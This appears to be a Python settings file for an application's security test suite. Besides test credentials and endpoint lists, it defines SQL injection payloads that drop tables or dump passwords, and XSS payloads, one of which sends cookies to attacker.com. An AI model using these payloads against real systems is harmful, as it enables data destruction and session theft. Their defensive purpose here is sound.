"""
Configuration settings for security tests.
"""
import os
from pathlib import Path

# Base directory
BASE_DIR = Path(__file__).parent.parent.parent.parent

# Test database settings
TEST_DB_URL = os.environ.get("SEC_TEST_DB_URL", "sqlite:///./test_security.db")

# Test user credentials
TEST_USER = {
    "username": "sectest",
    "password": "sectest123",
    "email": "sectest@example.com"
}

# Test admin credentials
TEST_ADMIN = {
    "username": "secadmin",
    "password": "secadmin123",
    "email": "secadmin@example.com"
}

# SQL injection test payloads
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT username, password FROM users; --",
    "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
    "' OR '1'='1' --",
    "admin'--",
    "1' OR '1' = '1",
    "1 OR 1=1",
    "' OR ''='",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "') OR ('1'='1'--",
    "' UNION SELECT 1, version() --"
]

# XSS test payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<svg onload='alert(\"XSS\")'>",
    "<body onload='alert(\"XSS\")'>",
    "javascript:alert('XSS')",
    "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
    "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
    "<a href=\"javascript:alert('XSS')\">Click me</a>"
]

# CSRF test settings
CSRF_TEST_ENDPOINTS = [
    "/api/auth/change-password",
    "/api/admin/users",
    "/api/share/query",
    "/api/user/profile"
]

# Authentication test settings
AUTH_TEST_ENDPOINTS = [
    "/api/db/list",
    "/api/db/schema/1",
    "/api/query/execute",
    "/api/history",
    "/api/admin/users"
]

# JWT test settings
JWT_TEST_SETTINGS = {
    "expired_token": True,
    "invalid_signature": True,
    "missing_claims": True,
    "wrong_audience": True,
    "tampered_payload": True
}

# Output directory for test results
RESULTS_DIR = BASE_DIR / "backend" / "tests" / "security" / "results"
RESULTS_DIR.mkdir(exist_ok=True, parents=True)

# Security scan settings
SECURITY_SCAN_PATHS = [
    BASE_DIR / "backend",
    BASE_DIR / "frontend" / "src"
]

# Security scan exclusions
SECURITY_SCAN_EXCLUDE = [
    "node_modules",
    "__pycache__",
    "venv",
    ".git",
    "tests"
]

# Security headers to check
SECURITY_HEADERS = [
    "X-Content-Type-Options",
    "X-Frame-Options",
    "Content-Security-Policy",
    "X-XSS-Protection",
    "Strict-Transport-Security",
    "Referrer-Policy"
]